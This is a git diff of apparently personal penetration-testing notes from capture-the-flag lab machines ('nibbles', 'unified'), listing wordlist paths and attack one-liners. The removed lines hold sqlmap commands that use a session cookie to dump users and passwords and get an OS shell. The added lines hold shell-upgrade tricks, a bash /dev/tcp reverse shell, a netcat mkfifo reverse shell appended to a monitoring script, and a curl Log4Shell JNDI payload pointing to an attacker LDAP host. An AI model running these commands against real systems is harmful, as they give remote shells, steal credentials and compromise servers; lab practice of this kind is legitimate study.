@@ -4,15 +4,25 @@ ruta interesante:
 /usr/share/webshells/php
 /usr/share/wordlists/rockyou.txt
 
-In order to have a functional shell though we can issue the following:
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-
-sqlmap -u 'http://10.129.52.53/dashboard.php?search=any+query' --cookie="PHPSESSID=2ihhrhn9lrvq6as0pmk0jhccgr" --batch --users
-
-sqlmap -u 'http://10.129.52.53/dashboard.php?search=any+query' --cookie="PHPSESSID=2ihhrhn9lrvq6as0pmk0jhccgr" --batch --password
-
-sqlmap -u 'http://10.129.52.53/dashboard.php?search=any+query' --cookie="PHPSESSID=2ihhrhn9lrvq6as0pmk0jhccgr" --batch --os-shell
-
-nmap -p 8443 --script http-title --script-args http.tls=true 10.129.60.191
-
 /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+
+nibbles - terminal
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+unified - terminal
+```
+script /dev/null -c bash
+```
+sqlmap - terminal
+```
+bash -c "bash -i >& /dev/tcp/{your_IP}/333 0>&1"
+```
+
+```
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.8 333 >/tmp/f' | tee -a monitor.sh
+```
+
+```bash
+curl -i -s -k -X POST -H $'Host: 10.129.96.149:8443' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://10.10.15.152:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.96.149:8443/api/login'
+```
